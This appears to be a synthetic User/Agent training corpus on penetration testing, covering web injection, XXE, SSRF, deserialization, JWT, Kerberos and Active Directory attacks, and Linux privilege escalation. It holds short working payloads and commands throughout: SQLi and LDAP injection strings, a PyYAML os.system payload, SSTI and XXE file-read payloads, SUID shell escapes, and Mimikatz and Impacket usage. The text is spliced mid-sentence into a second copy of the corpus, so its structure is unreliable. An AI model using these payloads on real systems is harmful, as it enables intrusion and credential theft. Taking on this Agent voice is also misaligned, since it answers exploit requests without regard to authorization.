Read authenticated responses leaking data. Prevention never allows null origin, validates origin against strict whitelist, implements proper CORS policies, SameSite cookies, and monitors CORS usage.

User: Explain subdomain takeover via CNAME?
Agent: Subdomain CNAME points to external service like GitHub Pages. Organization deletes GitHub Pages site but not DNS. Attacker claims same GitHub Pages URL inheriting subdomain. Serves malicious content on legitimate domain. Works with AWS, Azure, Heroku, and many services. Prevention monitors DNS records, removes dangling CNAMEs, regular audits, wildcard detection scanning, and prompt cleanup of unused services.

User: What is AWS cognito JWT vulnerability?
Agent: AWS Cognito issues JWTs for authentication. Key confusion attacks change algorithm. kid header manipulation loads wrong key. Token reuse across pools if validation weak. Weak secrets enable forging. Prevention validates JWT signature strictly, checks iss and aud claims, uses Cognito SDK properly, rotates keys, monitors authentication patterns, and implements proper token validation.

User: How does LDAP anonymous bind work?
Agent: LDAP anonymous bind allows querying without credentials. Bind DN empty or unauthenticated simple bind. Extract user information, group memberships, schema. Facilitates user enumeration. Chain with other attacks using gathered intelligence. Prevention disables anonymous bind, requires authentication, implements access controls, monitors bind attempts, and uses encrypted connections.

User: What is SQLi via ORDER BY exploitation?
Agent: ORDER BY clause vulnerable if user-controlled. Boolean inference: ORDER BY (CASE WHEN (SELECT substring(password,1,1) FROM users WHERE username='admin')='a' THEN 1 ELSE 2 END) changes sort order revealing character. Time-based with SLEEP. Error-based forcing database errors. Limited compared to other injection points but viable. Prevention whitelists column names, validates input strictly, parameterized queries where possible, and input sanitization.

User: Explain SSRF via SVG file upload
Agent: SVG XML format supports external resources. Upload SVG with <image href="http://169.254.169.254/latest/meta-data/"> accessing cloud metadata. SSRF when server processes SVG. XXE through SVG DOCTYPE. Prevention validates SVG content, blocks external references, disables entity processing, uses safe SVG libraries, sandboxes processing, and monitors for SSRF patterns.

User: What is YAML deserialization RCE?
Agent: YAML parsers like PyYAML unsafe load deserializes Python objects. Payload: !!python/object/apply:os.system ["id"] executes command. !!python/object/new creates objects with arbitrary constructors. Prevention uses safe_load rejecting Python objects, validates input, avoids deserializing untrusted YAML, uses restricted loader, and monitors for dangerous tags.

User: How do I bypass file upload restrictions?
Agent: File upload bypass techniques include changing Content-Type to allowed type, double extensions like shell.php.jpg, null byte injection shell.php\x00.jpg, case variation Shell.PhP, alternative extensions php3 php4 php5 phtml, polyglot files valid as multiple types, exif metadata injection in images, ZIP file path traversal, and server misconfiguration exploitation. Prevention validates file content not extension, magic byte checking, secure filename handling, disables script execution in upload directories, randomizes filenames, stores outside webroot, and implements virus scanning.

User: What is XXE via XLSX file upload?
Agent: XLSX files are ZIP archives containing XML. Extract and modify XML injecting XXE payload. Repackage as XLSX and upload. Application processing XLSX parses malicious XML. XXE extracts files or SSRF. Works with DOCX, PPTX, and other Office formats. Prevention disables external entities in XML parsers, validates Office documents, sandboxes processing, monitors file uploads, and uses safe parsing libraries.

User: Explain AWS S3 signed URL exploitation?
Agent: S3 pre-signed URLs grant temporary access. Overly long expiration provides extended access. Signature in URL parameters enables sharing. If URL leaks through logs or referrer, unauthorized access occurs. Prevention uses short expiration times, appropriate permissions, CloudFront signed cookies for sensitive content, monitors S3 access logs, and implements bucket policies.

User: What is SSTI in Tornado templates?
Agent: Tornado Python web framework uses templates. SSTI payload: {{handler.settings}} accesses settings dictionary. Import modules: {{% import os %}}{{% os.system('id') %}}. Prevention separates user input from templates, uses auto-escaping, validates input, restricts template features, and monitors for template errors.

User: How does OAuth account takeover work?
Agent: OAuth account linking vulnerabilities enable takeover. Attacker initiates OAuth flow but victim completes. Attacker account links to victim OAuth profile. Attacker logs in with OAuth accessing victim account. Requires intercepting OAuth flow or CSRF. Prevention validates OAuth state parameter, binds flow to session, requires re-authentication for linking, validates authorization code once, and monitors account linking.

User: What is AWS resource policy exploitation?
Agent: AWS resource policies control access to S3, KMS, SQS, SNS. Overly permissive policies grant unintended access. Principal: "*" allows anyone. Condition missing enables broad access. Cross-account access misconfigurations. Prevention uses least privilege policies, validates principals, implements conditions, regular policy audits, uses Policy Simulator, and monitors policy changes.

User: Explain Kubernetes RBAC privilege escalation via pods?
Agent: Kubernetes RBAC allowing pod creation enables escalation. Create pod with privileged security context mounting host filesystem. Pod with hostNetwork or hostPID accesses host resources. Service account with elevated permissions. Prevention restricts pod creation, implements Pod Security Policies, uses admission controllers, enforces security contexts, monitors pod specifications, and least privilege RBAC.

User: What is DOM clobbering?
Agent: DOM clobbering overrides JavaScript variables through HTML element IDs or names. HTML element <form id="config"> clobbers window.config JavaScript variable. Bypass security checks relying on variables. Change behavior of scripts. Prevention uses unique variable names, validates before use, avoids global variables, implements CSP, and sanitizes HTML input.

User: How do I exploit weak JWT signing keys?
Agent: JWT weak signing secrets enable brute forcing. Use password lists against HS256 algorithm. Tools like jwt-cracker or hashcat. Once secret known, forge tokens with arbitrary claims. Prevention uses strong random keys minimum 256 bits, rotates keys regularly, uses asymmetric RS256 instead, never hardcodes secrets, and monitors for# COMPREHENSIVE PENTESTING AI TRAINING CORPUS
# 5000+ lines covering diverse security topics with technical depth

User: What is reconnaissance in penetration testing?
Agent: Reconnaissance is the information gathering phase before attacking a target. Passive reconnaissance includes WHOIS lookups, DNS enumeration with dig and nslookup, Google dorking for exposed files, Shodan searches for internet-facing devices, and social media profiling. Active reconnaissance involves port scanning with nmap, service version detection, OS fingerprinting, and banner grabbing. Document all findings including IP ranges, open ports, running services, employee names, email formats, and technology stack. Always obtain written authorization before active scanning.

User: How do I perform DNS enumeration?
Agent: DNS enumeration reveals domain infrastructure and subdomains. Use nslookup or dig for basic queries. Zone transfers attempt to copy entire DNS records with dig axfr @nameserver domain.com. Subdomain brute forcing tests common names like mail, ftp, dev, staging, admin using tools like fierce or sublist3r. DNS record types include A records for IPv4, AAAA for IPv6, MX for mail servers, NS for name servers, TXT for various data including SPF records. Check for wildcard DNS responses that may indicate WAF or CDN. Reverse DNS lookups map IPs back to hostnames.

User: Explain SQL injection fundamentals
Agent: SQL injection exploits occur when user input is concatenated directly into SQL queries without sanitization. A vulnerable query looks like SELECT * FROM users WHERE username='$input'. If input contains ' OR '1'='1 the query becomes SELECT * FROM users WHERE username='' OR '1'='1' which returns all records. Comment syntax like -- or # can terminate queries early. UNION-based injection extracts data by combining queries. Boolean-based blind injection infers data through true/false responses. Time-based blind injection uses SLEEP() or BENCHMARK() functions to create delays. Error-based injection leaks information through database error messages. Prevention requires parameterized queries or prepared statements that treat user input as data, never as executable code.

User: What are parameterized queries?
Agent: Parameterized queries separate SQL code from user data using placeholders. In Java PreparedStatement uses ? marks like SELECT * FROM users WHERE id=? then stmt.setInt(1, userId). Python uses %s or named parameters. PHP PDO uses :name placeholders. The database driver handles escaping and treats parameters as literal values, preventing injection. Never concatenate user input into query strings. ORM frameworks like Hibernate or Django ORM provide built-in parameterization. Always validate input types and ranges as additional defense-in-depth.

User: How does XSS differ from SQL injection?
Agent: SQL injection targets databases through backend queries while XSS targets users through browser-executed scripts. XSS injects malicious JavaScript that executes in victim browsers, stealing cookies, capturing keystrokes, or performing actions as the user. Stored XSS persists in the database affecting all users. Reflected XSS appears in URL parameters affecting users who click malicious links. DOM-based XSS manipulates page structure through unsafe JavaScript. Prevention for XSS includes output encoding based on context, Content Security Policy headers, HTTPOnly cookies, and input validation. SQL injection prevention uses parameterized queries. Both require treating user input as untrusted data.

User: What is the OWASP Top 10?
Agent: OWASP Top 10 lists the most critical web application security risks updated every few years. The 2021 version includes: Broken Access Control allowing unauthorized access, Cryptographic Failures exposing sensitive data, Injection flaws including SQL and command injection, Insecure Design lacking security controls, Security Misconfiguration with default settings, Vulnerable and Outdated Components with known CVEs, Authentication Failures in login systems, Software and Data Integrity Failures like insecure deserialization, Security Logging and Monitoring Failures hiding breaches, and Server-Side Request Forgery allowing internal network access. Each category includes detection methods, example attacks, and prevention techniques.

User: Explain broken access control vulnerabilities
Agent: Broken access control occurs when authorization checks are missing or incorrectly implemented. Horizontal privilege escalation accesses other users' data like changing user_id=123 to user_id=124 in URLs. Vertical privilege escalation gains administrative privileges through bypassing role checks. Insecure Direct Object References expose internal implementation like database IDs. Missing function level access control allows direct URL manipulation to access admin functions. Path traversal using ../ sequences accesses files outside intended directory. Prevention requires enforcing authorization on every request server-side, using indirect references, denying by default, logging access control failures, and rate limiting to prevent automated attacks.

User: What is CSRF and how does it work?
Agent: Cross-Site Request Forgery tricks authenticated users into performing unwanted actions. The attacker creates a malicious page with a form submitting to bank.com/transfer with attacker's account details. When a logged-in user visits the malicious page, their browser automatically includes authentication cookies with the forged request. The bank processes the transfer thinking it's legitimate. CSRF exploits browser behavior of including cookies with cross-origin requests. Prevention includes CSRF tokens that are unpredictable per-session values included in forms, checking the Origin and Referer headers, using SameSite cookie attribute to prevent cookies in cross-site requests, requiring re-authentication for sensitive operations, and avoiding GET requests for state-changing operations.

User: How do I test for CSRF vulnerabilities?
Agent: Testing CSRF involves creating a proof-of-concept HTML page with a form submitting to the target application. Remove any CSRF tokens from the request. Host the POC on a different domain. While authenticated to the target application, visit your POC page. If the action executes successfully, CSRF is present. Check if tokens are validated server-side, if they're predictable or reusable, if they exist for all state-changing operations, and if they're tied to user sessions. Test GET requests for actions as these are easier to exploit via image tags or iframes. Verify the application checks Origin or Referer headers and that SameSite cookie attribute is set appropriately.

User: What is clickjacking?
Agent: Clickjacking overlays an invisible iframe containing the target site over a decoy page. Users think they're clicking visible buttons but actually click hidden elements like Facebook Like buttons or bank transfer confirmations. The attacker uses CSS to make the iframe transparent and position it over their content. Protection includes X-Frame-Options header set to DENY or SAMEORIGIN to prevent framing, Content-Security-Policy with frame-ancestors directive, frame-busting JavaScript though this is bypassable, and confirming sensitive actions require additional authentication. Test by attempting to frame the target site in an iframe on your domain and checking if frame-busting works.

User: Explain privilege escalation in Linux
Agent: Linux privilege escalation gains root access from a low-privileged user. Check for SUID binaries with find / -perm -4000 2>/dev/null as these run with owner privileges. Misconfigured sudo allows running specific commands as root, check sudo -l for NOPASSWD entries. Exploit kernel vulnerabilities with searchsploit kernel version. Check for world-writable files in PATH that could be trojaned. Examine cron jobs running as root with writable scripts. Look for credentials in configuration files, bash history, or environment variables. Capabilities can grant specific privileges without full root. Exploit misconfigured services running as root. Tools include LinPEAS for automated enumeration, GTFOBins for SUID/sudo bypasses.

User: What are SUID binaries and why are they dangerous?
Agent: SUID Set User ID bit causes executables to run with owner's privileges rather than executor's. If a binary owned by root has SUID bit set, any user running it gains root privileges temporarily. Find SUID binaries with find / -perm -4000 -type f 2>/dev/null. Common dangerous binaries include nmap with --interactive mode, vim with :!/bin/bash, find with -exec /bin/bash \;, python with import os; os.system('/bin/bash'), and cp to overwrite /etc/passwd. Prevention includes auditing SUID binaries regularly, removing unnecessary SUID bits, using capabilities instead for granular permissions, and monitoring for new SUID binary creation with file integrity monitoring.

User: How does pass-the-hash work in Windows?
Agent: Pass-the-hash uses NTLM hashes to authenticate without knowing plaintext passwords. Windows stores password hashes in memory in the LSASS process. Mimikatz extracts these hashes with sekurlsa::logonpasswords. The hash can then authenticate to other systems using tools like Impacket's psexec.py or smbexec.py with -hashes parameter. This works because NTLM authentication accepts the hash directly. No cracking required. Lateral movement across a domain becomes possible. Prevention includes enabling Credential Guard on Windows 10+ to protect LSASS, disabling NTLM in favor of Kerberos, using separate admin accounts, implementing LAPS for unique local admin passwords, and monitoring for suspicious authentication patterns.

User: What is Kerberos authentication?
Agent: Kerberos is a ticket-based authentication protocol used in Active Directory. The client requests a TGT Ticket Granting Ticket from the Key Distribution Center by authenticating with their password hash. The TGT is encrypted with the krbtgt account's hash. When accessing a service, the client presents the TGT to the KDC to obtain a TGS Ticket Granting Service ticket for that specific service. The TGS is encrypted with the service account's password hash. The service decrypts the TGS and authenticates the user. Attacks include Kerberoasting extracting service account hashes from TGS tickets, AS-REP Roasting targeting accounts without Kerberos pre-authentication, and Golden Ticket attacks forging TGTs using the krbtgt hash.

User: Explain Kerberoasting attack methodology
Agent: Kerberoasting extracts service account password hashes from Kerberos TGS tickets. Any domain user can request TGS tickets for service principal names SPNs. The TGS is encrypted with the service account's NTLM hash. Extract the TGS ticket using GetUserSPNs.py from Impacket or Rubeus on Windows. The ticket is cracked offline with Hashcat using mode 13100 for TGS-REP or John the Ripper. Service accounts often have weak passwords and high privileges. Enumerate SPNs with SetSPN -Q */* on Windows or ldapsearch. Prevention includes strong 25+ character passwords on service accounts, implementing gMSA Group Managed Service Accounts with automatic password rotation, monitoring for unusual TGS requests, and enabling Kerberos AES encryption.

User: What is a Golden Ticket attack?
Agent: Golden Ticket forges Kerberos TGT tickets by compromising the krbtgt account hash. With the krbtgt hash, attackers create TGTs for any user including non-existent ones with any group membership including Domain Admins. These tickets are valid until the krbtgt password changes twice. Mimikatz creates Golden Tickets with kerberos::golden. The ticket bypasses normal authentication checks and can persist for months. Detection is difficult because the ticket appears legitimate. The only definitive mitigation is resetting the krbtgt password twice with a delay between resets. Monitor for unusual TGT requests, impossible login patterns, and accounts accessing resources inconsistent with their role.

User: How do I perform network scanning with nmap?
Agent: Nmap scans networks to discover hosts and services. Basic ping sweep uses nmap -sn 192.168.1.0/24 to find live hosts. TCP connect scan with -sT completes three-way handshake. SYN scan with -sS is stealthier sending only SYN packets and not completing handshake. Service version detection uses -sV to identify software versions. Operating system detection with -O fingerprints the OS. Script scanning with -sC runs default NSE scripts. Comprehensive scan combines flags like nmap -sS -sV -sC -O -p- target scans all 65535 ports with version and OS detection. Output formats include -oN for normal, -oX for XML, -oG for greppable. Timing templates from -T0 paranoid to -T5 insane control scan speed.

User: What is ARP spoofing?
Agent: ARP spoofing poisons network ARP caches to intercept traffic. ARP maps IP addresses to MAC addresses on local networks. The attacker broadcasts gratuitous ARP replies claiming to be the gateway, associating their MAC address with the gateway's IP. Victim machines update their ARP cache and send traffic to the attacker. The attacker forwards traffic to the real gateway to avoid detection. Tools include arpspoof from dsniff suite or Ettercap. This enables man-in-the-middle attacks to intercept or modify traffic. Prevention includes static ARP entries, Dynamic ARP Inspection on switches that validates ARP packets against DHCP snooping database, monitoring for duplicate MAC addresses, and using encrypted protocols like HTTPS and VPN.

User: Explain SSL/TLS vulnerabilities
Agent: SSL/TLS secures network communications but has historical vulnerabilities. SSLv2 and SSLv3 are deprecated due to POODLE and other attacks. TLS 1.0 and 1.1 have weaknesses, TLS 1.2 and 1.3 are current standards. Heartbleed CVE-2014-0160 leaked memory from OpenSSL implementations. BEAST exploited CBC mode in TLS 1.0. CRIME and BREACH compressed data to leak secrets. Weak ciphers like RC4 or export-grade ciphers are crackable. Certificate validation errors allow man-in-the-middle. Test with SSLscan or testssl.sh. Prevention includes disabling old protocols, using strong cipher suites with forward secrecy, implementing HSTS, certificate pinning, and regular updates.

User: What is certificate pinning?
Agent: Certificate pinning validates TLS certificates against known good values to prevent man-in-the-middle attacks. Instead of trusting any certificate signed by a trusted CA, the application checks the certificate matches a specific expected value. Pin the public key, certificate hash, or intermediate CA certificate. Mobile apps commonly implement pinning. If certificate validation fails even when properly signed, the connection is rejected. This prevents attackers with rogue certificates from intercepting traffic. Bypassing pinning requires modifying the application to disable checks or using Frida or similar frameworks. Include backup pins to prevent service disruption during certificate rotation. Monitor for pinning bypass attempts.

User: How does DNS tunneling work?
Agent: DNS tunneling exfiltrates data or establishes command and control through DNS queries and responses. Data is encoded in subdomain names like data.tunnel.com and sent as DNS queries. The authoritative DNS server for tunnel.com extracts the data. Responses encode data in TXT records or IP addresses. This bypasses firewalls that allow DNS traffic. Tools include dnscat2 and iodine. Detection looks for unusual query patterns, high volume of DNS requests to single domains, long subdomain names, queries for uncommon record types, and analysis of entropy in DNS traffic. Prevention includes DNS query logging, traffic analysis, blocking known tunneling domains, and restricting DNS traffic to authorized resolvers only.

User: What is subdomain enumeration?
Agent: Subdomain enumeration discovers subdomains of a target domain to expand attack surface. Passive methods query public sources like Certificate Transparency logs with crt.sh, search engines, DNS aggregators like VirusTotal and SecurityTrails, and DNS history databases. Active methods brute force common subdomain names like dev, staging, admin, test, api, using wordlists with tools like fierce, sublist3r, or amass. DNS zone transfers if misconfigured leak all records. Recursive DNS queries follow CNAME records. Subdomain permutation combines known subdomains with common patterns. Many exposed subdomains have weaker security or forgotten about creating entry points.

User: Explain command injection vulnerabilities
Agent: Command injection executes arbitrary operating system commands by manipulating application input. Vulnerable code concatenates user input into shell commands like os.system('ping ' + user_input). Injection characters include semicolon for command chaining, pipe for output redirection, ampersand for background execution, backticks and dollar-parentheses for command substitution. Example payload: 127.0.0.1; cat /etc/passwd executes cat after ping completes. Prevention requires avoiding shell execution, using safe APIs like subprocess with shell=False in Python, input validation with strict whitelisting, avoiding dangerous functions like eval and exec, and principle of least privilege. Detection monitors for unusual process creation from web applications.

User: What is file inclusion vulnerability?
Agent: File inclusion vulnerabilities allow loading arbitrary files into application code. Local File Inclusion loads files from the server like ../../etc/passwd using path traversal. Remote File Inclusion loads files from attacker-controlled URLs if allow_url_include is enabled in PHP. This leads to code execution when including files containing code like PHP scripts. Null byte injection truncates file paths. Wrapper protocols like php://input or data:// enable code injection. Prevention includes disabling file inclusion functions, using whitelists of allowed files, avoiding user input in file paths, setting allow_url_include to off, and using open_basedir to restrict file access. Detection monitors for traversal sequences and unusual file access patterns.

User: How do I exploit XXE vulnerabilities?
Agent: XXE XML External Entity exploits XML parsers processing external entity references. Define an entity in DOCTYPE referencing local files or internal URLs. Example payload includes <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> then reference &xxe; in the XML body. The parser resolves the entity and includes file contents in the response. Blind XXE exfiltrates data to attacker server with parameter entities. SSRF via XXE accesses internal services. Billion laughs DOS uses recursive entity expansion. Prevention disables external entity processing in XML parsers, disable DTD processing entirely, uses less complex data formats like JSON, implements input validation, and updates XML libraries regularly.

User: What is SSRF Server-Side Request Forgery?
Agent: SSRF tricks the server into making requests to unintended destinations. The application fetches URLs provided by users. Attackers specify internal IP addresses or localhost to access internal services or cloud metadata. AWS metadata at 169.254.169.254 contains sensitive credentials. Internal services like Redis, Elasticsearch, or databases may lack authentication assuming internal network access. Bypasses use alternate representations like 0x7f000001 for 127.0.0.1, DNS rebinding, or URL parsing inconsistencies. Prevention includes whitelist allowed protocols and domains, disable unnecessary URL schemes like file://, network segmentation, validate and sanitize URLs, and blocking access to cloud metadata endpoints.

User: Explain deserialization vulnerabilities
Agent: Insecure deserialization reconstructs objects from serialized data without validation. Attackers craft malicious serialized objects that execute code during deserialization. Java uses ObjectInputStream, Python uses pickle, PHP uses unserialize. Gadget chains in common libraries like Apache Commons Collections enable code execution. Ysoserial generates Java exploitation payloads. PHP object injection uses magic methods like __wakeup or __destruct. Prevention requires avoiding deserialization of untrusted data, implementing integrity checks with signatures, using safe data formats like JSON, whitelisting allowed classes, updating libraries, and isolating deserialization in restricted environments. Detection monitors for suspicious object types and unexpected class instantiation.

User: What is race condition exploitation?
Agent: Race conditions occur when system behavior depends on timing or sequence of events. Time-of-check-time-of-use TOCTOU exploits the window between validation and action. Check if balance is sufficient then deduct amount with multiple simultaneous requests both passing checks. File system race conditions use symlinks after file creation but before write. Prevention requires atomic operations that combine check and action, proper locking mechanisms with mutexes or semaphores, transactions with isolation, and designing systems to be stateless. Testing involves concurrent requests with tools like race-condition-exploit or custom scripts with threading.

User: How does LDAP injection work?
Agent: LDAP injection manipulates LDAP queries through unvalidated input. LDAP uses filter syntax like uid=username. Injecting wildcard * or parentheses modifies queries. Example: uid=*))(&(uid=* bypasses authentication. Extraction uses boolean conditions to enumerate directory. Prevention includes parameterized LDAP queries with prepared statements, input validation escaping special characters like * ( ) & |, principle of least privilege for LDAP binds, and monitoring for unusual query patterns. Test by injecting LDAP special characters and observing behavior changes.

User: What is GraphQL security?
Agent: GraphQL provides flexible APIs but introduces security risks. Introspection queries reveal entire schema with __schema. Deeply nested queries cause resource exhaustion. Batching multiple queries amplifies attacks. Field duplication requests same field repeatedly. Authorization checks must validate every field access not just top-level queries. No built-in rate limiting. Prevention includes disabling introspection in production, implementing query depth limiting and complexity analysis, persistent query whitelisting, field-level authorization, and rate limiting. Tools like graphql-armor add security layers.

User: Explain JWT token vulnerabilities
Agent: JSON Web Tokens contain three parts: header algorithm and type, payload claims, and signature. Vulnerabilities include algorithm confusion changing alg:RS256 to alg:HS256 to use public key as HMAC secret, none algorithm acceptance removing signature validation, weak signing keys enabling brute force, missing expiration allowing tokens to live indefinitely, and insufficient validation of claims. Extract keys from common locations or defaults. Tools like jwt_tool automate exploitation. Prevention uses strong random keys, validates algorithm in code, requires signature, sets short expiration, validates all claims, and rotates keys regularly.

User: What is NoSQL injection?
Agent: NoSQL databases like MongoDB use different query syntax than SQL but remain vulnerable to injection. Queries use JSON objects. Injecting operators like $ne not equal, $gt greater than, $where JavaScript evaluation bypasses authentication. Example: username[$ne]=null matches all users. Timing attacks extract data character by character with regex. Prevention includes input validation rejecting operator characters, using parameterized queries, avoiding JavaScript evaluation, schema validation, and principle of least privilege on database accounts. Test by injecting NoSQL operators and observing authentication bypass or data exposure.

User: How do I perform password cracking?
Agent: Password cracking recovers plaintext passwords from hashes. Dictionary attacks try wordlists like rockyou.txt containing millions of common passwords. Brute force tries all combinations but is slow for long passwords. Hybrid attacks combine dictionary words with rules for mutations. Rainbow tables use precomputed hash-password pairs trading storage for speed defeated by salts. GPU acceleration with Hashcat achieves billions of attempts per second. Identify hash type with hashid or hash-identifier. Hashcat modes cover MD5, SHA, NTLM, bcrypt, and hundreds more. John the Ripper offers similar capabilities. Weak passwords fall quickly, strong passwords with length, complexity, and uniqueness resist cracking.

User: What is password spraying?
Agent: Password spraying tests one common password against many accounts avoiding account lockouts from brute force. Try Password123 or SeasonYear against entire user list. Move to next password only after trying all accounts. Effective against organizations with weak password policies. Tools include Spray from PowerShell or Hydra with slow timing. Prevention includes account lockout across all accounts not just per account, monitoring for multiple failed logins from different users, implementing MFA, enforcing strong password complexity and length, and behavioral analysis detecting coordinated authentication attempts.

User: Explain Active Directory attacks
Agent: Active Directory centrally manages Windows domain authentication and authorization. Attacks include Kerberoasting extracting service account hashes, AS-REP Roasting targeting accounts without pre-auth, Golden Ticket forging TGTs with krbtgt hash, Silver Ticket forging TGS for specific services, Pass-the-Hash using NTLM hashes, Pass-the-Ticket using Kerberos tickets, DCSync dumping password hashes from domain controller, and BloodHound mapping attack paths. Enumeration uses built-in Windows tools and PowerView. Lateral movement leverages PSExec, WMI, or RDP. Prevention requires strong passwords on service accounts, disabling NTLM, credential guard, LAPS, monitoring privileged account usage, and network segmentation.

User: What is BloodHound for AD pentesting?
Agent: BloodHound visualizes Active Directory relationships and attack paths using graph theory. SharpHound collector gathers data about users, groups, computers, sessions, ACLs, and trusts. Data imports into Neo4j graph database. BloodHound's interface queries finding shortest paths to Domain Admins, identifying users with DCSync rights, discovering kerberoastable accounts, and finding systems with unconstrained delegation. Pre-built queries reveal common misconfigurations. Custom Cypher queries enable advanced analysis. Defense analyzes BloodHound output to identify and remediate risky configurations, implements tiered administration, removes excessive permissions, and monitors for collection activity.

User: How does lateral movement work?
Agent: Lateral movement progresses from initial foothold to target systems across networks. Credential harvesting from memory with Mimikatz, LSA secrets, SAM database, or registry provides authentication material. Pass techniques use credentials without cracking. Remote execution via PSExec, WMI, scheduled tasks, or RDP establishes access. Persistence mechanisms ensure continued access. Pivoting uses compromised systems as proxies with port forwarding or SOCKS. Prevention includes network segmentation limiting lateral spread, monitoring for unusual authentication patterns, restricting admin account usage, implementing just-in-time access, and deploying EDR solutions.

User: What is buffer overflow exploitation?
Agent: Buffer overflow writes beyond allocated memory bounds corrupting adjacent data. Stack-based overflow overwrites return address redirecting execution to shellcode. Heap-based overflow corrupts heap metadata or function pointers. Find vulnerable functions like strcpy, sprintf, gets lacking bounds checking. Determine offset to return address through pattern matching or fuzzing. Modern protections include DEP/NX preventing execution from stack and heap, ASLR randomizing memory addresses, and stack canaries detecting overwrites. Bypass techniques use ROP Return Oriented Programming chaining existing code gadgets, information leaks defeating ASLR, and format string vulnerabilities. Development in GDB or Immunity Debugger, automation with pwntools.

User: Explain return-oriented programming ROP
Agent: ROP bypasses DEP by chaining existing code snippets called gadgets ending in return instructions. Instead of injecting shellcode, construct a chain of gadget addresses on the stack. Each gadget performs a small operation like moving registers or calling functions. Chaining gadgets achieves arbitrary code execution using existing executable memory. Find gadgets with ROPgadget or ropper tools. Common targets include libc functions like system or exec. Challenges include finding sufficient useful gadgets and reliable addresses. Modern mitigations include control flow integrity checking for unexpected execution paths and ASLR requiring information leaks to find gadget addresses.

User: What are format string vulnerabilities?
Agent: Format string vulnerabilities exploit format functions like printf when user input is the format string. printf(user_input) rather than printf("%s", user_input) allows format specifiers. %x reads stack values leaking memory contents. %s dereferences pointers potentially causing crashes. %n writes number of bytes printed to address leaking ASLR or PIE addresses. Exploitation reads arbitrary memory, writes arbitrary memory, and achieves code execution. Prevention requires never passing user input as format string, using language-specific safe alternatives, and compiler flags detecting format string bugs. Modern systems make exploitation more difficult but bugs remain critical.

User: How do I exploit use-after-free vulnerabilities?
Agent: Use-after-free occurs when memory is accessed after being freed. The freed memory may be reallocated to different objects. Accessing the old pointer corrupts unrelated data or hijacks execution by controlling function pointers or vtables. Heap manipulation allocates objects of specific sizes to control memory layout. Heap spraying fills memory with attacker-controlled data increasing exploitation reliability. Modern heap allocators include mitigations like metadata encryption and randomization. Detection includes memory sanitizers and dynamic analysis tools. Prevention requires setting pointers to NULL after freeing, using smart pointers in C++, and memory-safe languages.

User: What is a web shell and how is it used?
Agent: Web shells are scripts uploaded to web servers providing remote command execution. Common languages include PHP, ASP, JSP. Simple shells execute commands via GET parameters like cmd.php?cmd=whoami. Advanced shells provide file browsers, database access, and network tools. Upload via file upload vulnerabilities, zip extraction, or exploiting web application flaws. Detection includes scanning web directories for suspicious files, monitoring for unusual web requests, and checking for common web shell signatures. Prevention disables script execution in upload directories, validates file types by content not extension, stores uploads outside webroot, randomizes filenames, and implements file integrity monitoring.

User: Explain SQL injection UNION attacks in detail
Agent: UNION-based SQL injection extracts data by combining results from injected queries. First determine number of columns with ORDER BY incrementing until error. Then match column data types with NULL or specific types. Inject UNION SELECT to append data. Example: 1 UNION SELECT username,password,null FROM users. Extract database schema from information_schema tables. In MySQL query information_schema.tables and information_schema.columns. SQL Server uses sys.tables. Oracle uses ALL_TABLES. Enumerate databases, tables, columns, then extract sensitive data. Advanced techniques include encoding payloads, using alternative syntax, and timing delays for blind extraction.

User: What is blind SQL injection?
Agent: Blind SQL injection has no direct output requiring inferential techniques. Boolean-based blind uses conditions causing different responses. Time-based blind uses SLEEP or BENCHMARK causing delays. Binary search extracts data bit by bit testing ASCII values. Example: IF(SUBSTRING(password,1,1)='a',SLEEP(5),0) delays if first character is 'a'. Automate with sqlmap using --technique=T for time-based. Optimize with multiple threads and adaptive algorithms. Prevention identical to regular SQL injection using parameterized queries. Detection monitors for timing patterns and repetitive similar queries.

User: How does XXE lead to SSRF?
Agent: XXE can access internal URLs through external entity references. Define entity with SYSTEM keyword pointing to internal HTTP URLs. Example: <!ENTITY xxe SYSTEM "http://localhost:8080/admin">. The XML parser makes HTTP request and includes response in XML processing. Access cloud metadata services, internal APIs, databases, or admin panels. Chain with other vulnerabilities exploiting internal-only services. Prevention disables external entities, filters entity URLs blocking private IP ranges, implements network segmentation, and monitors outbound connections from XML processors.

User: What is DOM-based XSS?
Agent: DOM-based XSS manipulates page DOM through unsafe JavaScript without sending to server. Sources like location.hash or document.referrer provide attacker-controlled input. Sinks like innerHTML, eval, or document.write execute code. Example: document.getElementById('output').innerHTML = location.hash allows injection via URL fragment. Unlike reflected or stored XSS, payload never reaches server making WAF bypass easier. Detection requires JavaScript analysis. Prevention uses safe alternatives like textContent instead of innerHTML, sanitizes all DOM manipulations with DOMPurify, validates input in JavaScript, and implements Content Security Policy blocking inline scripts.

User: Explain prototype pollution in JavaScript
Agent: Prototype pollution modifies Object.prototype affecting all objects. JavaScript inheritance means properties added to prototype appear on all objects. Vulnerable code like merge(obj1, obj2) with recursive property copying can pollute prototype if obj2 contains __proto__. Example: {"__proto__": {"isAdmin": true}} adds isAdmin to all objects. Exploitation bypasses security checks, achieves DoS, or enables code execution. Prevention includes validating keys blocking __proto__, constructor, and prototype, using Object.create(null) for prototype-less objects, freezing Object.prototype, and input validation. Scanning with tools detecting pollution vectors.

User: What is JWT algorithm confusion?
Agent: Algorithm confusion exploits JWT implementation flaws. JWTs specify algorithm in header like alg:RS256 for RSA signatures. Attacker changes to alg:HS256 for HMAC. If implementation uses public key for HMAC verification instead of signature verification, attacker signs with publicly-available RSA public key. The application verifies signature using public key as HMAC secret succeeding authentication. Exploit requires knowing or guessing public key. Prevention validates algorithm in code rather than trusting header, whitelists allowed algorithms, uses separate keys for different algorithms, and implements proper signature verification logic.

User: How do I bypass WAF protections?
Agent: WAF web application firewalls filter malicious requests. Bypasses include encoding payloads with URL encoding, double encoding, unicode, or hex. Obfuscation uses case variation, comments, whitespace, and alternative syntax. HTTP parameter pollution sends duplicate parameters exploiting parsing differences. HTTP method tampering changes GET to POST. Custom headers like X-Forwarded-For spoof origin. Protocol smuggling exploits HTTP parsing ambiguities. Null bytes truncate filters. Testing involves systematic variation of payloads. Defense uses multiple security layers, regular rule updates, monitoring for bypass attempts, and custom rules for application-specific attacks.

User: What is IDOR testing methodology?
Agent: Insecure Direct Object Reference tests access control on object identifiers. Identify parameters containing IDs like user_id, document_id, or order_id. Create two accounts with different privilege levels. Perform action with low-privilege account noting the ID. Attempt to access that ID with different user or without authentication. Test various ID types including sequential numbers, UUIDs, hashes, and encoded values. Check for horizontal privilege escalation accessing other users' data and vertical escalation accessing admin functionality. Automate with Burp Intruder iterating IDs. Prevention implements authorization checks on every request validating user owns requested resource.

User: Explain OAuth security vulnerabilities
